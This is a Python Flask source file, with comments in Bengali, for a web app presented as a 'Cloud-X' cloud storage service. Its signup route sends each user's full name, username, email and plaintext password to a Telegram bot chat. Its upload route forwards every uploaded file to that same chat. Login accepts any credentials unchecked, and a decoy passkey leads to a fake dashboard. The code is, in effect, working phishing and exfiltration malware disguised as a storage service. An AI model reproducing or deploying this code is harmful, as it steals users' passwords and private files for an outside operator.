import os
import sqlite3
import requests
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'cloud-x-secret-key-security'

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# পাসকি সেট করুন (আপনার ইচ্ছমতো ৬ ডিজিট দিন)
REAL_PASSKEY = "123456"   # এই পাসকি দিলে আসল ড্যাশবোর্ডে যাবে
FAKE_PASSKEY = "654321"   # এই পাসকি দিলে ফেক ড্যাশবোর্ডে যাবে (অথবা অন্য যেকোনো ৬ ডিজিট)

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def init_db():
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            filename TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-page')
def login_page():
    return render_template('login.html')

# লগইন সফল হওয়ার পর ইউজারকে সরাসরি পাসকি পেজে পাঠানো হবে
@app.route('/passkey')
def passkey_page():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    
    # প্রতিবার নতুন করে পাসকি দিতে হবে, তাই ভেরিফাইড স্ট্যাটাস রিসেট করে দিলাম
    session.pop('passkey_verified', None)
    return render_template('passkey.html')

# পাসকি ভেরিফিকেশন রাউট
@app.route('/verify-passkey', methods=['POST'])
def verify_passkey():
    data = request.get_json()
    entered_passkey = data.get('passkey')

    if entered_passkey == REAL_PASSKEY:
        session['passkey_verified'] = 'real'
        return jsonify({"status": "real"})
    elif entered_passkey == FAKE_PASSKEY:
        session['passkey_verified'] = 'fake'
        return jsonify({"status": "fake"})
    else:
        return jsonify({"status": "error"})

# আসল ড্যাশবোর্ড (শুধুমাত্র সঠিক পাসকি দিলে ঢুকতে পারবে)
@app.route('/dashboard')
def dashboard():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    
    return render_template('dashboard.html', 
                           username=session.get('username'), 
                           email=session.get('email'))

# ফেক ড্যাশবোর্ড (ভুল বা ফেক পাসকি দিলে এই পেজে আসবে)
@app.route('/fake-dashboard')
def fake_dashboard():
    if 'username' not in session or session.get('passkey_verified') != 'fake':
        return redirect(url_for('passkey_page'))
    
    return render_template('fake_dashboard.html')

@app.route('/vault')
def vault_page():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    
    return render_template('vault.html', username=session.get('username'))

@app.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    telegram_message = (
        f"🚨 *New Cloud-X Registration* 🚨\n\n"
        f"👤 *Full Name:* {full_name}\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
    return jsonify({"status": "success"})

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    session['username'] = username
    session['email'] = email
    
    return jsonify({"status": "success"})

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return jsonify({"status": "error", "message": "Unauthorized"})

    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"})
    
    file = request.files['file']
    if file.filename == '' or not allowed_file(file.filename):
        return jsonify({"status": "error", "message": "Invalid file"})
    
    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    current_user = session.get('username')

    # টেলিগ্রামে পাঠানো
    tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(filepath, 'rb') as f:
        requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"📁 *Upload by* {current_user}: {filename}", "parse_mode": "Markdown"}, files={'document': f})

    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO files (username, filename) VALUES (?, ?)", (current_user, filename))
    conn.commit()
    conn.close()

    return jsonify({"status": "success", "filename": filename})

@app.route('/get_files', methods=['GET'])
def get_files():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return jsonify({"files": []})

    current_user = session.get('username')
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("SELECT filename FROM files WHERE username = ?", (current_user,))
    rows = cursor.fetchall()
    conn.close()

    return jsonify({"files": [{"filename": r[0]} for r in rows]})

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
